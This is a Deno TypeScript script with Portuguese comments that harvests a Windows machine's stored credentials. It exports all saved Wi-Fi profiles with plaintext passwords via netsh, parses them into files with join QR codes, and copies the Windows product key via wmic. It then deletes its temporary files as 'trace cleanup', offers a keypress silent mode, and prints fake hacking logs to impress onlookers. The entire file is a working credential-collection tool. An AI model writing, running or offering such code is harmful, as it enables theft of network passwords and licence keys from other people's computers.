import { SpinnerTypes, TerminalSpinner } from '@spinners';
import { keypress } from '@cliffy/keypress';
import { DateTime } from '@luxon';
import colors from '@colors';
import { delay } from '@std';
import qr from '@qrcode';

/** showLogs
 * Se for false, nada será exibido no console
 * e os delays serão desativados
 */
let showLogs: boolean | number = true;
let currentSector: string;
let winLKey: string;
let counter = 0;
colors;

/** sleep()
 * Função intermediária para delay();
 * verifica se o silent mode is on
 */
const sleep = (timeout: number) => showLogs ? delay(timeout) : null;

/** SilentMode()
 * Ativa o Listener para o teclado
 */
silentMode();

// Title.txt contém uma string colorida bem cringe
const title: string = await Deno.readTextFile('Title.txt')
	.catch(() => '');
console.log(title || '');

class Spinner {
	sector: string;
	text: string;
	spinner: TerminalSpinner | undefined;

	constructor(text: string, sector?: string) {
		this.sector = sector || currentSector;
		this.text = text;

		// Inicia Spinner
		showLogs &&
			(this.spinner = new TerminalSpinner({
				text: this._format(),
				spinner: {
					interval: 40,
					frames: SpinnerTypes.dots.frames,
				},
				indent: 1,
				color: 'cyan',
			}).start());
	}

	end(msg?: string) {
		this.text = msg || this.text;
		this.spinner?.succeed(this._format());
	}

	fail(msg?: string) {
		this.text = msg || this.text;
		this.spinner?.fail(this._format());
	}

	_format() {
		return [ // Modelo de string
			'[',
			this.sector.toUpperCase().cyan, // [ SECTOR
			'|',
			getTimestamp('T').yellow, // [ SECTOR | 18:04
			'] -',
			this.text,
		].join(' '); // [ SETOR | 18:04 ] - TEXT
	}
}

// "injetar trojan" vulgo acessar uma API nativa do Windows
await NetSHProfileCollector();

// Copiar key do Windows
await copyWinKey();

// Limpar registros de arquivos
await clearTraces();

async function NetSHProfileCollector() {
	createFakeLogs();
	/** createFakeLogs()
	 * chamei a função sem await pra ela exibir os logs
	 * enquanto o resto do código continua rodando
	 */

	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
		.catch(() => {});

	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
		.catch(() => {});

	// Chama a API do Windows
	await executeCommand(
		'netsh wlan export profile key=clear folder=.tempdata',
	);

	for await (const file of Deno.readDir('.tempdata')) {
		/** for
		 * Por padrão, A API fornece as informações em arquivos XML bem poluídos
		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
		 */
		counter++;

		// Lendo o conteúdo do arquivo
		const content = await Deno.readTextFile(`.tempdata/${file.name}`);

		// Filtrando as tags que são úteis
		const [SSID, , security, password] = clearTags(content.matchAll(
			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
		));

		// Gerando QR Code para conectar
		qr.setErrorLevel('H');
		let wifiQR: string;
		qr.generate(
			`WIFI:S:${SSID};T:${security};P:${password};H:false;;`,
			{ small: true },
			(qrCode: string) => wifiQR = qrCode,
		);

		// Escrevendo arquivos com as informações filtradas no diretório final
		await Deno.writeTextFile(
			`WiFiPasswords/${SSID}.txt`,
			`SSID: ${SSID}\nData: ${getTimestamp()}\nNível de segurança: ${security}\nSenha: ${password}\n\n${wifiQR!}`,
		);
	}
}

async function copyWinKey() {
	winLKey = (await executeCommand(
		'wmic path softwarelicensingservice get OA3xOriginalProductKey',
	)).split('\n')[1];

	Deno.mkdir('WindowsKeys') // Cria pasta de chaves do Windows (se não existir)
		.catch(() => {});

	Deno.writeTextFileSync(
		`WindowsKeys/${Deno.hostname()}.txt`,
		`Máquina: ${Deno.hostname()}\nData: ${getTimestamp()}\nChave de ativação do Windows: ${winLKey}`,
	);
}

async function clearTraces() {
	await Deno.remove('.tempdata', { recursive: true })
		// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
		.catch(() => {});
}

async function createFakeLogs() {
	currentSector = 'Wi-Fi CLONER';
	const fakeLogs = [
		['Injetando Trojan na API do NetSH...', 'Script injetado.'],
		['Modificando permissões do Windows...', 'Permissões concedidas.'],
		[
			'Abrindo porta no FireWall...',
			'FireWall desbloqueado na porta 8080.',
		],
	];

	// Exibe status fakes pra impressionar leigos
	for (const msg of fakeLogs) {
		const spinner = new Spinner(msg[0]);
		await sleep(random());
		spinner.end(msg[1]);
	}

	const wifiLog = new Spinner('Clonando redes Wi-Fi...');
	await sleep(random(1_000, 3_000));
	wifiLog.end(`${counter} redes clonadas.`);

	currentSector = 'KEY CLONER';
	const keyLog = new Spinner('Obtendo chave de ativação...');
	await sleep(random());
	keyLog.end(`Chave de ativação obtida: ${winLKey}`);

	currentSector = 'CLEANER';
	const tracesLog = new Spinner('Apagando registros...');
	await sleep(random());
	tracesLog.end('Registros excluídos.');

	Deno.exit();
}

async function executeCommand(cmd: string) {
	const process = Deno.run({
		cmd: cmd.split(' '),
		stdout: 'piped',
		stderr: 'piped',
	}); // Executa o comando

	// Decodifica o retorno do processo
	const res = new TextDecoder()
		.decode(await process.output());

	process.close(); // Encerra processo

	return res;
}

function clearTags(matches: IterableIterator<RegExpMatchArray>) {
	// Regex pra filtrar as tags do XML
	const res: string[] = [];
	for (const match of matches) {
		res.push(
			String(match[0])
				.replace(/<.*?>/g, ''),
		);
	}
	return res;
}

function random(min = 500, max = 2_500) {
	// Retorna um número aleatório entre min e max
	return Math.floor(Math.random() * (max - min) + min);
}

function getTimestamp(format = 'DDDD'): string {
	return DateTime.now()
		.setZone('America/Sao_Paulo')
		.setLocale('pt')
		.toFormat(format); // Data formatada
}

async function silentMode() {
	for await (const event of keypress()) {
		if (event.ctrlKey && event.key === 'c') Deno.exit();

		// quando a tecla S for pressionada
		if (event.key === 's') showLogs = false;
		// ativa o silent mode
	}
}
